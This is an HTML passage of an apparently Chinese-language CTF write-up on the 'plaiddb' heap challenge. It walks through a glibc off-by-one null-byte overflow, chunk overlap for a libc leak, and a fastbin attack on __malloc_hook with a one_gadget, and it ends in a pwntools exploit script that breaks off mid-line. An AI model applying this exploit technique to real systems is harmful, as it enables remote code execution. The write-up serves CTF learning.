srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" /><p>â€‹        3.ç°åœ¨bçš„å¯æ§å¤§å°ä¸º0x200ï¼Œå­˜äºunsort binï¼Œç°åœ¨å°†å…¶è¿›è¡Œåˆ†å‰²ã€‚b1 = malloc(0x100)ï¼Œb2 = malloc(0x80)ã€‚b1ç”¨æ¥è¿›è¡Œunlinkåˆå¹¶ï¼Œb2ç”¨æ¥overlapã€‚</p><p>â€‹        4.é‡Šæ”¾b1ï¼Œé‡Šæ”¾cï¼Œç³»ç»Ÿä¼šæ ¹æ®cçš„pre_sizeæ‰¾åˆ°b1çš„sizeï¼Œå‘ç°in_use == 0ï¼Œäºæ˜¯å°†å…¶åˆå¹¶ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œb1åˆ°céƒ½å˜æˆäº†ä¸€ä¸ªchunkè¢«æ”¶åˆ°unsort binä¸­ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" /><p>â€‹        5.d = malloc(0x400)ï¼Œå¯ä»¥ä½¿å¾—dçš„ä¸€éƒ¨åˆ†ä¸b2å‘ç”Ÿoverlapã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:30%;" /><p>â€‹        6.overlapä¹‹åå¯ä»¥è¿›è¡Œå¾ˆå¤šæ”»å‡»ã€‚ä¾‹å¦‚å…ˆfree(d)ï¼Œå†mallocå‡ºdåˆ°b2ä¸­é—´çš„éƒ¨åˆ†ï¼Œæ­¤æ—¶b2åˆ°barrierçš„å‰©ä½™ç©ºé—´ä»ä½œä¸ºä¸€ä¸ªå­¤é›¶é›¶çš„chunkå‘†åœ¨unsort binï¼Œæ‰€ä»¥å…¶fdï¼Œbkéƒ½æŒ‡å‘main arenaï¼Œå†ç”¨å¯æ§çš„chunk b2å°±å¯ä»¥leakã€‚</p><h2 id="0x01-plaiddb"><a href="#0x01-plaiddb" class="headerlink" title="0x01 . plaiddb"></a>0x01 . plaiddb</h2><p>â€‹        å¤©çŸ¥é“æˆ‘æŸ¥äº†å¤šå°‘ä¸ªwriteupï¼Œèƒ½åŸºæœ¬çœ‹æ‡‚çš„ä¹Ÿåªæœ‰ctf-wikiçš„ã€‚ã€‚ã€‚ã€‚ï¼ˆCTF-WikiğŸ‚ğŸºï¼ï¼ï¼‰</p><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        64ä½ï¼Œæ–‡ä»¶ä¿æŠ¤å…¨å¼€ã€‚ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><p>â€‹    ä¸»è¦çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼ˆå‚è€ƒå‚è€ƒCTF-Wikiï¼Œæˆ‘åªåˆ†æå‡ºå‰ä¸‰ä¸ªã€‚ã€‚ï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span>    </span><br><span class="line">    <span class="keyword">char</span> *key;    </span><br><span class="line">    <span class="keyword">long</span> data_size;   </span><br><span class="line">    <span class="keyword">char</span> *data;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span>    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span>    </span><br><span class="line">    <span class="keyword">long</span> what_1;    </span><br><span class="line">    <span class="keyword">long</span> what_2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    æ€ªä¸å¾—ä¸€å¤§ç‰‡ä¹±ç³Ÿç³Ÿçš„æŒ‡é’ˆæ“ä½œï¼ŒåŸæ¥æ˜¯æ ‘ç»“æ„ã€‚é‚£è¿˜åˆ†æä¸ªğŸ”¨ã€‚</p><p>â€‹    ä¸è¿‡çœ‹äº†çœ‹writeupå¥½åƒè¿™é¢˜åˆ©ç”¨è·Ÿæ ‘ç»“æ„æ²¡å•¥å…³ç³»ã€‚</p><p>â€‹    ä¸»è¦å‡½æ•°æœ‰ï¼šGET(show_single)ï¼ŒPUT(add)ï¼ŒDUMP(show_all)ï¼ŒDEL(delete)ï¼Œread_inã€‚</p><p>â€‹    æ¼æ´åœ¨read_inå‡½æ•°é‡Œï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚ã€‚è€Œä¸”æ­¤å¤„ç”¨åˆ°çš„æ˜¯realloc()å‡½æ•°ï¼Œç”³è¯·çš„å†…å­˜å¤§å°æ˜¯å¯ç”¨å¤§å°é€æ¬¡ä¹˜2æ‰€å¾—çš„ç»“æœï¼Œæ‰€ä»¥è¯´éœ€è¦ç‰¹å®šå¤§å°çš„chunkæ‰èƒ½è¿›è¡Œæº¢å‡ºã€‚(0x18,0x38,0x78,0xf8,0x1f8)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = <span class="built_in">malloc_usable_size</span>(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(stdin);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">sub_1020</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);<span class="comment">//realloc require a special size of chunk</span></span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = <span class="built_in">malloc_usable_size</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        å…ˆæ¥è·‘ä¸€éç¨‹åºçœ‹çœ‹ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><p>â€‹        æ ¹æ®ä»¥ä¸‹heapç»“æ„ä»¥åŠidaçš„é™æ€åˆ†æå¯ä»¥çœ‹å‡ºï¼Œæ¯æ‰§è¡Œä¸€æ¬¡PUTï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸‰ä¸ªè¿ç»­çš„chunkã€‚a.row ç»“æ„ä½“(0x40)    b.row key(0x20)    c.row data(size)ã€‚ç»“æ„ä½“ä¸­å­˜æœ‰æŒ‡å‘keyå’Œdataçš„æŒ‡é’ˆã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><h3 id="B-Memory-Arrangement"><a href="#B-Memory-Arrangement" class="headerlink" title="B. Memory Arrangement"></a>B. Memory Arrangement</h3><p>â€‹        1.mallocå‡ºéœ€è¦çš„chunk</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);<span class="comment">//unsort chunk,</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x50</span>);<span class="comment">//overlap chunkï¼Œleak libc_base</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x68</span>);<span class="comment">//ä¿®æ”¹å…¶fdï¼Œç”¨äºfast attack</span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);<span class="comment">//æº¢å‡ºchunkï¼Œä¿®æ”¹ä¸‹ä¸€chunkçš„pre_sizeå’Œin_useå­—èŠ‚ï¼ˆç”¨åˆ°äº†off_by_oneæ¼æ´ï¼‰</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);<span class="comment">//victim chunkï¼Œè¢«æº¢å‡ºchunk</span></span><br><span class="line">barrier = <span class="built_in">malloc</span>(<span class="number">0x400</span>)<span class="comment">//ç¡®ä¿ä»¥ä¸Šchunkä¸è¢«top chunkåˆå¹¶ã€‚</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>â€‹        2.æŠŠaï¼Œcï¼Œdä¸‰ä¸ªchunké‡Šæ”¾ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>â€‹        3.å› ä¸ºDELå‡½æ•°ä¹Ÿç”¨åˆ°äº†read_in å‡½æ•°ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºï¼Œæ‰€ä»¥è¿™é‡ŒDEL(payload)ï¼Œpayloadå¤§å°ä¸º0x1f8ï¼Œè€Œchunk_då®é™…å¯å†™å¤§å°åªæœ‰0x1f0ï¼Œå› æ­¤å¯ä»¥åœ¨payloadçš„æœ€åå†™å…¥fake_pre_sizeï¼ŒåŒæ—¶è¦†å†™äº†chunk_eçš„pre_sizeå’Œin_useå­—èŠ‚ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>â€‹        4.ç°åœ¨é‡Šæ”¾chunk_eï¼Œç³»ç»Ÿå°†å¯»å€è‡³chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,ç³»ç»Ÿå°†chunk_a unlinkï¼Œç„¶ååˆå¹¶aåˆ°eçš„æ‰€æœ‰å†…å­˜ï¼Œå¹¶å…¥ä¸€ä¸ªunsort chunkã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>â€‹        5.è€Œchunk_bè¿˜åœ¨ä½¿ç”¨ï¼Œé€ æˆäº†overlapã€‚</p><p>â€‹        6.æ¥ä¸‹æ¥malloc(0x200)ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æŠŠåŸæ¥é‡Šæ”¾çš„chunk_aåˆ†é…å‡ºæ¥ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨åæ¥è¢«ç³»ç»Ÿåˆå¹¶çš„å¤§chunkä¸­å‰²ä¸‹0x210çš„ç©ºé—´ï¼Œç„¶åè¿™ä¸ªå¤§chunkçš„åœ°å€å°†å’Œchunk_bé‡åˆã€‚ç”±äºåªæœ‰å¤§chunkä¸€ä¸ªunsort chunkåœ¨binä¸­ï¼Œå› æ­¤å…¶fdï¼ŒbkæŒ‡å‘main_arenaï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºäº†ã€‚</p><h3 id="C-Leak-Libc-base-amp-get-shell"><a href="#C-Leak-Libc-base-amp-get-shell" class="headerlink" title="C. Leak Libc_base &amp; get shell"></a>C. Leak Libc_base &amp; get shell</h3><p>â€‹        1.GET(chunk_b)å¹¶é€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°libc_baseï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç®—å‡ºmalloc_hookçš„åœ°å€ã€‚</p><p>â€‹        2.ç”¨one_gadgetå¾—åˆ°libcä¸­excute(â€œ/bin/shâ€);çš„åœ°å€</p><p>â€‹        3.malloc(0x100)ï¼Œå¯ä»¥å¾—åˆ°chunk_båˆ°chunk_b + 0x100çš„å†…å­˜ï¼Œç”¨æ¥å¡«å……chunk_bï¼Œå¹¶ç”¨malloc_hookçš„ä¸Šæ–¹åœ°å€è¦†å†™chunk_cçš„fdã€‚</p><p>â€‹        4.mallocä¸¤æ¬¡ï¼Œä»¥malloc_hookä¸Šæ–¹åœ°å€ä¸ºé¦–åœ°å€çš„chunkï¼Œå†™å…¥one_gadgetåˆ°malloc_hookï¼Œå®Œäº‹å„¿ã€‚ã€‚</p><h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D  . Exploit"></a>D  . Exploit</h3><p>â€‹        è„šæœ¬è¿˜æ˜¯å¾—å‚è€ƒCTF-Wikiï¼Œè‡ªå·±çœŸæ˜¯è‚ä¸å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        PATH = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p = process(PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># ubuntu 16.04</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command_num</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">key, size, data</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; size:</span><br><span class="line">        p.send(data.ljust(size, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; bytes&#x27;</span>).strip(<span class="string">&#x27; bytes&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># avoid complicity of structure malloc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        put(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocate what we want in order</span></span><br><span class="line">    put(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;5&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;3&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;4&#x27;</span>, <span class="number">0xf0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x400</span>, <span class="string">&#x27;defense-data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free those need to be freed</span></span><br><span class="line">    delete(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;0x200&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;0x200 fillup&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup again&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_leak = u64(get(<span class="string">&#x27;2&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    p.info(<span class="string">&#x27;libc leak: 0x%x&#x27;</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">    p.info(<span class="string">&#x27;libc_base: 0x%x&#x27;</span> % libc_base)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;fastatk&#x27;</span>, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))</span><br><span class="line">    put(<span class="string">&#x27;prepare&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;prepare data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    put(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span 